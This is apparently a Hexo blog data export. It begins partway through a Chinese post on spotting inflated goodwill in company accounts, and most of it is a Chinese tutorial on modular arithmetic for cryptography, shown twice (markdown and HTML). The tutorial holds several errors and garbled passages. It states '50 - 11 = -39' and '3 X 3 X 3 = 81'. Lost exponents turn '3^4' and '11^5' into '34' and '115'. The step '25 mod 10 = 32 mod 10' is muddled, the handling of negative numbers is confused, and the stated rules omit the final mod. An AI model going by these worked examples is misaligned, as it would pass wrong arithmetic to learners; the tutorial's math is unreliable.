誉，商誉就会在母公司财务报表中体现出来。</p>\n<p>这个套路影视行业玩的最厉害，从行业的财务就看的出来，某上市公司影视娱乐公司旗下的艺人随便成立一个工作室，然后上市公司就斥巨资来收购，间接就完成了资产转移，这样在母公司财报里面产生天量商誉。大家可以看看，目前影视类公司的商誉普遍占净资产达到30%以上。如果两公司没任何协同效应，这些商誉价值也就为零，但仍几十上百亿的挂在资产负债表中的资产项目中。而且这些商誉地未来公司赚钱时还会做减值测试，也就是说会从利润里面扣除，直接就影响公司净利润。</p>\n<p>因此，在做投资时，很简单，打开财务报表，翻到资产负债表，看资产项目下商誉有多少，再看商誉占净资产的比率，只要占比达到10%以上的就可以排除，或许可能错过一些好公司，但绝对能规避一大批成心思不正的上市公司。</p>\n"},{"title":"密码学家的数学_模mod运算","date":"2024-11-15T12:34:38.000Z","_content":"\n# 密码学家的数学：模（MOD)运算\n\n模算法是密码学中的核心数学概念。\n\n从凯撒密码到RSA密码，几乎任何密码都会用到模运算。\n\n因此，我将在这里教大家怎么进行模加法、模减法、模乘法、模除法和模幂运算。\n\n这是一个很容易理解的概念，让我们开始吧:\n\nMod、模数和模运算是什么意思？\n\n“模数”(缩写为“mod”)，在拉丁语中是“余数、残数”的意思，表示“取去整体的一部分后剩下的部分”。\n\n因此，“模”或“模运算”实际上是“余数算术”。\n\n更精确地说:我们正在寻找一个整数除以另一个整数时作为余数出现的整数(或“剩余值”)。\n\n让我们举三个例子:\n\n例子1：\n\n当7除以3时，余数是1。\n\n我们可以理解为，你本身有7块钱，平分给3个人后，最后你只剩下一块钱。\n\n当然，我们也可以用模运算的方式表示:\n\n7 = 3X2 + 1，其中1是我们需要的整数余数:\n\n7 mod 3 = 1\n\n其读成7的3模等于1.\n\n例子2：\n\n当8除以3时，剩下的余数是2。因此，我们写成:\n\n8 mod 3 = 2\n\n例子3：\n\n当9除以3时，它没有余数。因此，我们写成:\n\n9 mod 3 = 0\n\n关于确定余数的计算称为“模运算”。它在1801年由德国数学家卡尔·弗里德里希·高斯首次研究了这一理论。\n\n你可能听过你的数学老师说过关于高斯的故事，一天，高斯的老师布置了一道题，1+2+3······这样从1一直加到100等于多少。\n\n高斯很快就脱口而出：5050，因为1+100=101，2+99=101······50+51=101。从1加到100有50组这样的数，所以50X101=5050。”\n\n这当然也适用于大数据:\n\n例如365 MOD 7 = 1 (因为365 = 52 X 7 + 1 )\n\n下面我在说说全等数：\n\n当除以某个模数时，其余数的整数是相似的，但是不相同。这些数字就称为“全等数”。\n\n例如，1和13以及25、37是全等mod 12，因为它们在除以12时余数都是相同的。\n\n我们可以把它写成1 = 13 = 25 = 37 mod 12。\n\n一些注意的要点：\n\n1、关于负数计算，例如-12的MOD22\n\n遇到负数就不能使用，12除以22才计算余数，而是22除以12来计算余数。\n\n2、当整数比被除数小时怎么运算，比如说2mod15等于多少？\n\n答案是等于2。\n\n![loadingag307](密码学家的数学_模mod运算/45f02930021cca2a24e7b374f0bd5aceb436734a.png)\n\n模运算有时候也称为时钟运算。你可以看看你房间里那个12小时的时钟。\n\n你在钟上看到了12个数字，这里，模数为12，剩余的12个模数为0、1、2，..11，所以，当你给出时间时，你实际上给出了一个介于0和11之间的余数。同样，模数m = 12负责提醒你。\n\n在模运算中，我们加、减、乘、除和取幂的方法如下:\n\n1、模加法：\n\n让我们从最简单地开始: 现在是11点，10小时后是几点？\n\n它是11 + 10 = 21点，21减去模数12剩下9的余数，因此是9点。\n\n现在是11点，22小时后是几点？\n\n它是11 + 22 = 33，并且减去模数12 (有也称为“除”)再次得到结果9点。忽略上午和下午，因为我们是在时钟上进行mod运算。\n\n让我们用mod算法写出两个例子:\n\n11 + 10 = 21 mod 12 = 9\n\n11 + 22 = 33 mod 12 = 9\n\n从上面的例子上，我们可以看到模加法的计算原理是:先将这两个数字相加，然后将总和除以模数以计算余数。\n\n2、模减法：\n\n模减法也是用类似的方式进行:\n\n先减，然后计算余数。\n\n例子1：25 - 8 = 17 MOD 12 = 5\n\n例子2 : 50 - 11 = 39 MOD 12 = 3\n\n如果我们计算出的结果是错误的呢？\n\n例如：假设现在是纽约2点，洛杉矶是几点？\n\n将指针向后转动3小时，因为纽约时间比洛杉矶时间快3小时\n\n2 - 3 = - 1 MOD 12 = 11\n\n这个计算显然是错误的，出现这种情况，我们需将模数相加，得到一个整数。该数字必须介于0到模数之间的数字。\n\n例子3 : 3 - 50 = - 47 MOD 12 = 1，因为- 1 + 12 = 11，12-11=1\n\n例子4 : 14 - 77 = - 63 MOD 12 = 9，因为- 63 + 12 + 12 + 12 + 12 + 12 = -3，12-3=9\n\n例子5 : 50 - 11 = - 39 MOD 15 = 6，因为- 39 + 15 + 15 = -9,15-9=6\n\n![](密码学家的数学_模mod运算/c1195a9510556da159632802ad710b46096747c1.png)\n\n3、模乘法\n\n由于整数的乘法其实就是重复加法，因此可以将其简化为上述模加法。\n\n我们怎么计算5 X8 MOD 12？\n\n首先我们先乘: 5X 8 = 40\n\n然后，我们就找到了余数: 40 MOD 12 = 4。\n\nMod算法的3个计算规则：\n\n1. a + b mod m = (a mod m) + (b mod m)\n\n2. a - b mod m = (a mod m) - (b mod m)\n\n3. a Xb mod m = (a mod m) X (b mod m)\n\n3、模除法\n\n模除法其实是乘法的逆运算。这意味着可以通过“查找剩余余数”在进行模乘法来解决。\n\n例子：\n\n为了计算5 ÷7 mod 12，我们引入了一个x\n\nx = 5 ÷ 7 mod 12，将两侧乘以7\n\n7x = 5mod12\n\n我们通过测试12个不同的余数0，1，...11\n\n然后得到x = 11，因为\n\n7 X11 mod 12 = 77 mod 12 = 5\n\n如果模数如上所述很小，反复试验就会找到答案。但是如果模数大，测试每个余数需要花费很长时间。\n\n当然，我们可以写个程序让计算机为我们做测试。\n\n不过，还有另外一种直接的方法来进行模除法:\n\n为了计算5 ÷7 mod 12\n\n我们首先，就像上面那样，将两边乘以7 :\n\nx X7 = 5 mod 12\n\n为了隔离x，我们简单地将两边乘以7 mod 12的倒数，这是因为7X7 mod 12 = 49 mod 12 = 1。\n\n现在，我们把两边乘以7，左边是x，右边是7X 5 mod 12 = 35 mod 12 = 11。\n\n因此，x = 11mod12或5 / 7 = 11mod12。\n\n计算完成。\n\n4、模幂运算\n\n在RSA密码的加密过程中，会用到模幂运算。\n\n由于模幂运算是重复乘法，因此可以将其简化为上述模乘法。\n\n我们如何计算34 MOD 12？\n\n首先我们相乘: 3 X 3 X 3 = 81，\n\n然后，我们找到余数: 81 mod 12 = 9\n\n怎么计算大数据呢？例如115 mod 10\n\n我们先计算( 11 mod 10 ) = 1，并将答案乘以5倍，得到答案1\n\n用这种快捷方法，125 mod 10的答案为2，因为12 mod 10 = 2和25 mod 10 = 32 mod 10 = 2。\n\n原理 :不需要先计算(大)幂，然后再找到余数，而是先找到较小幂的余数，然后对它们进行模乘法，得到最终答案\n","source":"_posts/密码学家的数学_模mod运算.md","raw":"---\ntitle: 密码学家的数学_模mod运算\ndate: 2024-11-15 20:34:38\ntags: [crypto]\n---\n\n# 密码学家的数学：模（MOD)运算\n\n模算法是密码学中的核心数学概念。\n\n从凯撒密码到RSA密码，几乎任何密码都会用到模运算。\n\n因此，我将在这里教大家怎么进行模加法、模减法、模乘法、模除法和模幂运算。\n\n这是一个很容易理解的概念，让我们开始吧:\n\nMod、模数和模运算是什么意思？\n\n“模数”(缩写为“mod”)，在拉丁语中是“余数、残数”的意思，表示“取去整体的一部分后剩下的部分”。\n\n因此，“模”或“模运算”实际上是“余数算术”。\n\n更精确地说:我们正在寻找一个整数除以另一个整数时作为余数出现的整数(或“剩余值”)。\n\n让我们举三个例子:\n\n例子1：\n\n当7除以3时，余数是1。\n\n我们可以理解为，你本身有7块钱，平分给3个人后，最后你只剩下一块钱。\n\n当然，我们也可以用模运算的方式表示:\n\n7 = 3X2 + 1，其中1是我们需要的整数余数:\n\n7 mod 3 = 1\n\n其读成7的3模等于1.\n\n例子2：\n\n当8除以3时，剩下的余数是2。因此，我们写成:\n\n8 mod 3 = 2\n\n例子3：\n\n当9除以3时，它没有余数。因此，我们写成:\n\n9 mod 3 = 0\n\n关于确定余数的计算称为“模运算”。它在1801年由德国数学家卡尔·弗里德里希·高斯首次研究了这一理论。\n\n你可能听过你的数学老师说过关于高斯的故事，一天，高斯的老师布置了一道题，1+2+3······这样从1一直加到100等于多少。\n\n高斯很快就脱口而出：5050，因为1+100=101，2+99=101······50+51=101。从1加到100有50组这样的数，所以50X101=5050。”\n\n这当然也适用于大数据:\n\n例如365 MOD 7 = 1 (因为365 = 52 X 7 + 1 )\n\n下面我在说说全等数：\n\n当除以某个模数时，其余数的整数是相似的，但是不相同。这些数字就称为“全等数”。\n\n例如，1和13以及25、37是全等mod 12，因为它们在除以12时余数都是相同的。\n\n我们可以把它写成1 = 13 = 25 = 37 mod 12。\n\n一些注意的要点：\n\n1、关于负数计算，例如-12的MOD22\n\n遇到负数就不能使用，12除以22才计算余数，而是22除以12来计算余数。\n\n2、当整数比被除数小时怎么运算，比如说2mod15等于多少？\n\n答案是等于2。\n\n![loadingag307](密码学家的数学_模mod运算/45f02930021cca2a24e7b374f0bd5aceb436734a.png)\n\n模运算有时候也称为时钟运算。你可以看看你房间里那个12小时的时钟。\n\n你在钟上看到了12个数字，这里，模数为12，剩余的12个模数为0、1、2，..11，所以，当你给出时间时，你实际上给出了一个介于0和11之间的余数。同样，模数m = 12负责提醒你。\n\n在模运算中，我们加、减、乘、除和取幂的方法如下:\n\n1、模加法：\n\n让我们从最简单地开始: 现在是11点，10小时后是几点？\n\n它是11 + 10 = 21点，21减去模数12剩下9的余数，因此是9点。\n\n现在是11点，22小时后是几点？\n\n它是11 + 22 = 33，并且减去模数12 (有也称为“除”)再次得到结果9点。忽略上午和下午，因为我们是在时钟上进行mod运算。\n\n让我们用mod算法写出两个例子:\n\n11 + 10 = 21 mod 12 = 9\n\n11 + 22 = 33 mod 12 = 9\n\n从上面的例子上，我们可以看到模加法的计算原理是:先将这两个数字相加，然后将总和除以模数以计算余数。\n\n2、模减法：\n\n模减法也是用类似的方式进行:\n\n先减，然后计算余数。\n\n例子1：25 - 8 = 17 MOD 12 = 5\n\n例子2 : 50 - 11 = 39 MOD 12 = 3\n\n如果我们计算出的结果是错误的呢？\n\n例如：假设现在是纽约2点，洛杉矶是几点？\n\n将指针向后转动3小时，因为纽约时间比洛杉矶时间快3小时\n\n2 - 3 = - 1 MOD 12 = 11\n\n这个计算显然是错误的，出现这种情况，我们需将模数相加，得到一个整数。该数字必须介于0到模数之间的数字。\n\n例子3 : 3 - 50 = - 47 MOD 12 = 1，因为- 1 + 12 = 11，12-11=1\n\n例子4 : 14 - 77 = - 63 MOD 12 = 9，因为- 63 + 12 + 12 + 12 + 12 + 12 = -3，12-3=9\n\n例子5 : 50 - 11 = - 39 MOD 15 = 6，因为- 39 + 15 + 15 = -9,15-9=6\n\n![](密码学家的数学_模mod运算/c1195a9510556da159632802ad710b46096747c1.png)\n\n3、模乘法\n\n由于整数的乘法其实就是重复加法，因此可以将其简化为上述模加法。\n\n我们怎么计算5 X8 MOD 12？\n\n首先我们先乘: 5X 8 = 40\n\n然后，我们就找到了余数: 40 MOD 12 = 4。\n\nMod算法的3个计算规则：\n\n1. a + b mod m = (a mod m) + (b mod m)\n\n2. a - b mod m = (a mod m) - (b mod m)\n\n3. a Xb mod m = (a mod m) X (b mod m)\n\n3、模除法\n\n模除法其实是乘法的逆运算。这意味着可以通过“查找剩余余数”在进行模乘法来解决。\n\n例子：\n\n为了计算5 ÷7 mod 12，我们引入了一个x\n\nx = 5 ÷ 7 mod 12，将两侧乘以7\n\n7x = 5mod12\n\n我们通过测试12个不同的余数0，1，...11\n\n然后得到x = 11，因为\n\n7 X11 mod 12 = 77 mod 12 = 5\n\n如果模数如上所述很小，反复试验就会找到答案。但是如果模数大，测试每个余数需要花费很长时间。\n\n当然，我们可以写个程序让计算机为我们做测试。\n\n不过，还有另外一种直接的方法来进行模除法:\n\n为了计算5 ÷7 mod 12\n\n我们首先，就像上面那样，将两边乘以7 :\n\nx X7 = 5 mod 12\n\n为了隔离x，我们简单地将两边乘以7 mod 12的倒数，这是因为7X7 mod 12 = 49 mod 12 = 1。\n\n现在，我们把两边乘以7，左边是x，右边是7X 5 mod 12 = 35 mod 12 = 11。\n\n因此，x = 11mod12或5 / 7 = 11mod12。\n\n计算完成。\n\n4、模幂运算\n\n在RSA密码的加密过程中，会用到模幂运算。\n\n由于模幂运算是重复乘法，因此可以将其简化为上述模乘法。\n\n我们如何计算34 MOD 12？\n\n首先我们相乘: 3 X 3 X 3 = 81，\n\n然后，我们找到余数: 81 mod 12 = 9\n\n怎么计算大数据呢？例如115 mod 10\n\n我们先计算( 11 mod 10 ) = 1，并将答案乘以5倍，得到答案1\n\n用这种快捷方法，125 mod 10的答案为2，因为12 mod 10 = 2和25 mod 10 = 32 mod 10 = 2。\n\n原理 :不需要先计算(大)幂，然后再找到余数，而是先找到较小幂的余数，然后对它们进行模乘法，得到最终答案\n","slug":"密码学家的数学_模mod运算","published":1,"updated":"2024-11-15T14:13:51.963Z","comments":1,"layout":"post","photos":[],"_id":"cm3kcor33000n8oi4bvvmduhr","content":"<h1 id=\"密码学家的数学：模（MOD-运算\"><a href=\"#密码学家的数学：模（MOD-运算\" class=\"headerlink\" title=\"密码学家的数学：模（MOD)运算\"></a>密码学家的数学：模（MOD)运算</h1><p>模算法是密码学中的核心数学概念。</p>\n<p>从凯撒密码到RSA密码，几乎任何密码都会用到模运算。</p>\n<p>因此，我将在这里教大家怎么进行模加法、模减法、模乘法、模除法和模幂运算。</p>\n<p>这是一个很容易理解的概念，让我们开始吧:</p>\n<p>Mod、模数和模运算是什么意思？</p>\n<p>“模数”(缩写为“mod”)，在拉丁语中是“余数、残数”的意思，表示“取去整体的一部分后剩下的部分”。</p>\n<p>因此，“模”或“模运算”实际上是“余数算术”。</p>\n<p>更精确地说:我们正在寻找一个整数除以另一个整数时作为余数出现的整数(或“剩余值”)。</p>\n<p>让我们举三个例子:</p>\n<p>例子1：</p>\n<p>当7除以3时，余数是1。</p>\n<p>我们可以理解为，你本身有7块钱，平分给3个人后，最后你只剩下一块钱。</p>\n<p>当然，我们也可以用模运算的方式表示:</p>\n<p>7 &#x3D; 3X2 + 1，其中1是我们需要的整数余数:</p>\n<p>7 mod 3 &#x3D; 1</p>\n<p>其读成7的3模等于1.</p>\n<p>例子2：</p>\n<p>当8除以3时，剩下的余数是2。因此，我们写成:</p>\n<p>8 mod 3 &#x3D; 2</p>\n<p>例子3：</p>\n<p>当9除以3时，它没有余数。因此，我们写成:</p>\n<p>9 mod 3 &#x3D; 0</p>\n<p>关于确定余数的计算称为“模运算”。它在1801年由德国数学家卡尔·弗里德里希·高斯首次研究了这一理论。</p>\n<p>你可能听过你的数学老师说过关于高斯的故事，一天，高斯的老师布置了一道题，1+2+3······这样从1一直加到100等于多少。</p>\n<p>高斯很快就脱口而出：5050，因为1+100&#x3D;101，2+99&#x3D;101······50+51&#x3D;101。从1加到100有50组这样的数，所以50X101&#x3D;5050。”</p>\n<p>这当然也适用于大数据:</p>\n<p>例如365 MOD 7 &#x3D; 1 (因为365 &#x3D; 52 X 7 + 1 )</p>\n<p>下面我在说说全等数：</p>\n<p>当除以某个模数时，其余数的整数是相似的，但是不相同。这些数字就称为“全等数”。</p>\n<p>例如，1和13以及25、37是全等mod 12，因为它们在除以12时余数都是相同的。</p>\n<p>我们可以把它写成1 &#x3D; 13 &#x3D; 25 &#x3D; 37 mod 12。</p>\n<p>一些注意的要点：</p>\n<p>1、关于负数计算，例如-12的MOD22</p>\n<p>遇到负数就不能使用，12除以22才计算余数，而是22除以12来计算余数。</p>\n<p>2、当整数比被除数小时怎么运算，比如说2mod15等于多少？</p>\n<p>答案是等于2。</p>\n<img src=\"/2024/11/15/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%B6%E7%9A%84%E6%95%B0%E5%AD%A6_%E6%A8%A1mod%E8%BF%90%E7%AE%97/45f02930021cca2a24e7b374f0bd5aceb436734a.png\" class=\"\" title=\"loadingag307\">\n\n<p>模运算有时候也称为时钟运算。你可以看看你房间里那个12小时的时钟。</p>\n<p>你在钟上看到了12个数字，这里，模数为12，剩余的12个模数为0、1、2，..11，所以，当你给出时间时，你实际上给出了一个介于0和11之间的余数。同样，模数m &#x3D; 12负责提醒你。</p>\n<p>在模运算中，我们加、减、乘、除和取幂的方法如下:</p>\n<p>1、模加法：</p>\n<p>让我们从最简单地开始: 现在是11点，10小时后是几点？</p>\n<p>它是11 + 10 &#x3D; 21点，21减去模数12剩下9的余数，因此是9点。</p>\n<p>现在是11点，22小时后是几点？</p>\n<p>它是11 + 22 &#x3D; 33，并且减去模数12 (有也称为“除”)再次得到结果9点。忽略上午和下午，因为我们是在时钟上进行mod运算。</p>\n<p>让我们用mod算法写出两个例子:</p>\n<p>11 + 10 &#x3D; 21 mod 12 &#x3D; 9</p>\n<p>11 + 22 &#x3D; 33 mod 12 &#x3D; 9</p>\n<p>从上面的例子上，我们可以看到模加法的计算原理是:先将这两个数字相加，然后将总和除以模数以计算余数。</p>\n<p>2、模减法：</p>\n<p>模减法也是用类似的方式进行:</p>\n<p>先减，然后计算余数。</p>\n<p>例子1：25 - 8 &#x3D; 17 MOD 12 &#x3D; 5</p>\n<p>例子2 : 50 - 11 &#x3D; 39 MOD 12 &#x3D; 3</p>\n<p>如果我们计算出的结果是错误的呢？</p>\n<p>例如：假设现在是纽约2点，洛杉矶是几点？</p>\n<p>将指针向后转动3小时，因为纽约时间比洛杉矶时间快3小时</p>\n<p>2 - 3 &#x3D; - 1 MOD 12 &#x3D; 11</p>\n<p>这个计算显然是错误的，出现这种情况，我们需将模数相加，得到一个整数。该数字必须介于0到模数之间的数字。</p>\n<p>例子3 : 3 - 50 &#x3D; - 47 MOD 12 &#x3D; 1，因为- 1 + 12 &#x3D; 11，12-11&#x3D;1</p>\n<p>例子4 : 14 - 77 &#x3D; - 63 MOD 12 &#x3D; 9，因为- 63 + 12 + 12 + 12 + 12 + 12 &#x3D; -3，12-3&#x3D;9</p>\n<p>例子5 : 50 - 11 &#x3D; - 39 MOD 15 &#x3D; 6，因为- 39 + 15 + 15 &#x3D; -9,15-9&#x3D;6</p>\n<img src=\"/2024/11/15/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%B6%E7%9A%84%E6%95%B0%E5%AD%A6_%E6%A8%A1mod%E8%BF%90%E7%AE%97/c1195a9510556da159632802ad710b46096747c1.png\" class=\"\">\n\n<p>3、模乘法</p>\n<p>由于整数的乘法其实就是重复加法，因此可以将其简化为上述模加法。</p>\n<p>我们怎么计算5 X8 MOD 12？</p>\n<p>首先我们先乘: 5X 8 &#x3D; 40</p>\n<p>然后，我们就找到了余数: 40 MOD 12 &#x3D; 4。</p>\n<p>Mod算法的3个计算规则：</p>\n<ol>\n<li><p>a + b mod m &#x3D; (a mod m) + (b mod m)</p>\n</li>\n<li><p>a - b mod m &#x3D; (a mod m) - (b mod m)</p>\n</li>\n<li><p>a Xb mod m &#x3D; (a mod m) X (b mod m)</p>\n</li>\n</ol>\n<p>3、模除法</p>\n<p>模除法其实是乘法的逆运算。这意味着可以通过“查找剩余余数”在进行模乘法来解决。</p>\n<p>例子：</p>\n<p>为了计算5 ÷7 mod 12，我们引入了一个x</p>\n<p>x &#x3D; 5 ÷ 7 mod 12，将两侧乘以7</p>\n<p>7x &#x3D; 5mod12</p>\n<p>我们通过测试12个不同的余数0，1，…11</p>\n<p>然后得到x &#x3D; 11，因为</p>\n<p>7 X11 mod 12 &#x3D; 77 mod 12 &#x3D; 5</p>\n<p>如果模数如上所述很小，反复试验就会找到答案。但是如果模数大，测试每个余数需要花费很长时间。</p>\n<p>当然，我们可以写个程序让计算机为我们做测试。</p>\n<p>不过，还有另外一种直接的方法来进行模除法:</p>\n<p>为了计算5 ÷7 mod 12</p>\n<p>我们首先，就像上面那样，将两边乘以7 :</p>\n<p>x X7 &#x3D; 5 mod 12</p>\n<p>为了隔离x，我们简单地将两边乘以7 mod 12的倒数，这是因为7X7 mod 12 &#x3D; 49 mod 12 &#x3D; 1。</p>\n<p>现在，我们把两边乘以7，左边是x，右边是7X 5 mod 12 &#x3D; 35 mod 12 &#x3D; 11。</p>\n<p>因此，x &#x3D; 11mod12或5 &#x2F; 7 &#x3D; 11mod12。</p>\n<p>计算完成。</p>\n<p>4、模幂运算</p>\n<p>在RSA密码的加密过程中，会用到模幂运算。</p>\n<p>由于模幂运算是重复乘法，因此可以将其简化为上述模乘法。</p>\n<p>我们如何计算34 MOD 12？</p>\n<p>首先我们相乘: 3 X 3 X 3 &#x3D; 81，</p>\n<p>然后，我们找到余数: 81 mod 12 &#x3D; 9</p>\n<p>怎么计算大数据呢？例如115 mod 10</p>\n<p>我们先计算( 11 mod 10 ) &#x3D; 1，并将答案乘以5倍，得到答案1</p>\n<p>用这种快捷方法，125 mod 10的答案为2，因为12 mod 10 &#x3D; 2和25 mod 10 &#x3D; 32 mod 10 &#x3D; 2。</p>\n<p>原理 :不需要先计算(大)幂，然后再找到余数，而是先找到较小幂的余数，然后对它们进行模乘法，得到最终答案</p>\n","excerpt":"","more":"<h1 id=\"密码学家的数学：模（MOD-运算\"><a href=\"#密码学家的数学：模（MOD-运算\" class=\"headerlink\" title=\"密码学家的数学：模（MOD)运算\"></a>密码学家的数学：模（MOD)运算</h1><p>模算法是密码学中的核心数学概念。</p>\n<p>从凯撒密码到RSA密码，几乎任何密码都会用到模运算。</p>\n<p>因此，我将在这里教大家怎么进行模加法、模减法、模乘法、模除法和模幂运算。</p>\n<p>这是一个很容易理解的概念，让我们开始吧:</p>\n<p>Mod、模数和模运算是什么意思？</p>\n<p>“模数”(缩写为“mod”)，在拉丁语中是“余数、残数”的意思，表示“取去整体的一部分后剩下的部分”。</p>\n<p>因此，“模”或“模运算”实际上是“余数算术”。</p>\n<p>更精确地说:我们正在寻找一个整数除以另一个整数时作为余数出现的整数(或“剩余值”)。</p>\n<p>让我们举三个例子:</p>\n<p>例子1：</p>\n<p>当7除以3时，余数是1。</p>\n<p>我们可以理解为，你本身有7块钱，平分给3个人后，最后你只剩下一块钱。</p>\n<p>当然，我们也可以用模运算的方式表示:</p>\n<p>7 &#x3D; 3X2 + 1，其中1是我们需要的整数余数:</p>\n<p>7 mod 3 &#x3D; 1</p>\n<p>其读成7的3模等于1.</p>\n<p>例子2：</p>\n<p>当8除以3时，剩下的余数是2。因此，我们写成:</p>\n<p>8 mod 3 &#x3D; 2</p>\n<p>例子3：</p>\n<p>当9除以3时，它没有余数。因此，我们写成:</p>\n<p>9 mod 3 &#x3D; 0</p>\n<p>关于确定余数的计算称为“模运算”。它在1801年由德国数学家卡尔·弗里德里希·高斯首次研究了这一理论。</p>\n<p>你可能听过你的数学老师说过关于高斯的故事，一天，高斯的老师布置了一道题，1+2+3······这样从1一直加到100等于多少。</p>\n<p>高斯很快就脱口而出：5050，因为1+100&#x3D;101，2+99&#x3D;101······50+51&#x3D;101。从1加到100有50组这样的数，所以50X101&#x3D;5050。”</p>\n<p>这当然也适用于大数据:</p>\n<p>例如365 MOD 7 &#x3D; 1 (因为365 &#x3D; 52 X 7 + 1 )</p>\n<p>下面我在说说全等数：</p>\n<p>当除以某个模数时，其余数的整数是相似的，但是不相同。这些数字就称为“全等数”。</p>\n<p>例如，1和13以及25、37是全等mod 12，因为它们在除以12时余数都是相同的。</p>\n<p>我们可以把它写成1 &#x3D; 13 &#x3D; 25 &#x3D; 37 mod 12。</p>\n<p>一些注意的要点：</p>\n<p>1、关于负数计算，例如-12的MOD22</p>\n<p>遇到负数就不能使用，12除以22才计算余数，而是22除以12来计算余数。</p>\n<p>2、当整数比被除数小时怎么运算，比如说2mod15等于多少？</p>\n<p>答案是等于2。</p>\n<img src=\"/2024/11/15/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%B6%E7%9A%84%E6%95%B0%E5%AD%A6_%E6%A8%A1mod%E8%BF%90%E7%AE%97/45f02930021cca2a24e7b374f0bd5aceb436734a.png\" class=\"\" title=\"loadingag307\">\n\n<p>模运算有时候也称为时钟运算。你可以看看你房间里那个12小时的时钟。</p>\n<p>你在钟上看到了12个数字，这里，模数为12，剩余的12个模数为0、1、2，..11，所以，当你给出时间时，你实际上给出了一个介于0和11之间的余数。同样，模数m &#x3D; 12负责提醒你。</p>\n<p>在模运算中，我们加、减、乘、除和取幂的方法如下:</p>\n<p>1、模加法：</p>\n<p>让我们从最简单地开始: 现在是11点，10小时后是几点？</p>\n<p>它是11 + 10 &#x3D; 21点，21减去模数12剩下9的余数，因此是9点。</p>\n<p>现在是11点，22小时后是几点？</p>\n<p>它是11 + 22 &#x3D; 33，并且减去模数12 (有也称为“除”)再次得到结果9点。忽略上午和下午，因为我们是在时钟上进行mod运算。</p>\n<p>让我们用mod算法写出两个例子:</p>\n<p>11 + 10 &#x3D; 21 mod 12 &#x3D; 9</p>\n<p>11 + 22 &#x3D; 33 mod 12 &#x3D; 9</p>\n<p>从上面的例子上，我们可以看到模加法的计算原理是:先将这两个数字相加，然后将总和除以模数以计算余数。</p>\n<p>2、模减法：</p>\n<p>模减法也是用类似的方式进行:</p>\n<p>先减，然后计算余数。</p>\n<p>例子1：25 - 8 &#x3D; 17 MOD 12 &#x3D; 5</p>\n<p>例子2 : 50 - 11 &#x3D; 39 MOD 12 &#x3D; 3</p>\n<p>如果我们计算出的结果是错误的呢？</p>\n<p>例如：假设现在是纽约2点，洛杉矶是几点？</p>\n<p>将指针向后转动3小时，因为纽约时间比洛杉矶时间快3小时</p>\n<p>2 - 3 &#x3D; - 1 MOD 12 &#x3D; 11</p>\n<p>这个计算显然是错误的，出现这种情况，我们需将模数相加，得到一个整数。该数字必须介于0到模数之间的数字。</p>\n<p>例子3 : 3 - 50 &#x3D; - 47 MOD 12 &#x3D; 1，因为- 1 + 12 &#x3D; 11，12-11&#x3D;1</p>\n<p>例子4 : 14 - 77 &#x3D; - 63 MOD 12 &#x3D; 9，因为- 63 + 12 + 12 + 12 + 12 + 12 &#x3D; -3，12-3&#x3D;9</p>\n<p>例子5 : 50 - 11 &#x3D; - 39 MOD 15 &#x3D; 6，因为- 39 + 15 + 15 &#x3D; -9,15-9&#x3D;6</p>\n<img src=\"/2024/11/15/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%B6%E7%9A%84%E6%95%B0%E5%AD%A6_%E6%A8%A1mod%E8%BF%90%E7%AE%97/c1195a9510556da159632802ad710b46096747c1.png\" class=\"\">\n\n<p>3、模乘法</p>\n<p>由于整数的乘法其实就是重复加法，因此可以将其简化为上述模加法。</p>\n<p>我们怎么计算5 X8 MOD 12？</p>\n<p>首先我们先乘: 5X 8 &#x3D; 40</p>\n<p>然后，我们就找到了余数: 40 MOD 12 &#x3D; 4。</p>\n<p>Mod算法的3个计算规则：</p>\n<ol>\n<li><p>a + b mod m &#x3D; (a mod m) + (b mod m)</p>\n</li>\n<li><p>a - b mod m &#x3D; (a mod m) - (b mod m)</p>\n</li>\n<li><p>a Xb mod m &#x3D; (a mod m) X (b mod m)</p>\n</li>\n</ol>\n<p>3、模除法</p>\n<p>模除法其实是乘法的逆运算。这意味着可以通过“查找剩余余数”在进行模乘法来解决。</p>\n<p>例子：</p>\n<p>为了计算5 ÷7 mod 12，我们引入了一个x</p>\n<p>x &#x3D; 5 ÷ 7 mod 12，将两侧乘以7</p>\n<p>7x &#x3D; 5mod12</p>\n<p>我们通过测试12个不同的余数0，1，…11</p>\n<p>然后得到x &#x3D; 11，因为</p>\n<p>7 X11 mod 12 &#x3D; 77 mod 12 &#x3D; 5</p>\n<p>如果模数如上所述很小，反复试验就会找到答案。但是如果模数大，测试每个余数需要花费很长时间。</p>\n<p>当然，我们可以写个程序让计算机为我们做测试。</p>\n<p>不过，还有另外一种直接的方法来进行模除法:</p>\n<p>为了计算5 ÷7 mod 12</p>\n<p>我们首先，就像上面那样，将两边乘以7 :</p>\n<p>x X7 &#x3D; 5 mod 12</p>\n<p>为了隔离x，我们简单地将两边乘以7 mod 12的倒数，这是因为7X7 mod 12 &#x3D; 49 mod 12 &#x3D; 1。</p>\n<p>现在，我们把两边乘以7，左边是x，右边是7X 5 mod 12 &#x3D; 35 mod 12 &#x3D; 11。</p>\n<p>因此，x &#x3D; 11mod12或5 &#x2F; 7 &#x3D; 11mod12。</p>\n<p>计算完成。</p>\n<p>4、模幂运算</p>\n<p>在RSA密码的加密过程中，会用到模幂运算。</p>\n<p>由于模幂运算是重复乘法，因此可以将其简化为上述模乘法。</p>\n<p>我们如何计算34 MOD 12？</p>\n<p>首先我们相乘: 3 X 3 X 3 &#x3D; 81，</p>\n<p>然后，我们找到余数: 81 mod 12 &#x3D; 9</p>\n<p>怎么计算大数据呢？例如115 mod 10</p>\n<p>我们先计算( 11 mod 10 ) &#x3D; 1，并将答案乘以5倍，得到答案1</p>\n<p>用这种快捷方法，125 mod 10的答案为2，因为12 mod 10 &#x3D; 2和25 mod 10 &#x3D; 32 mod 10 &#x3D; 2。</p>\n<p>原理 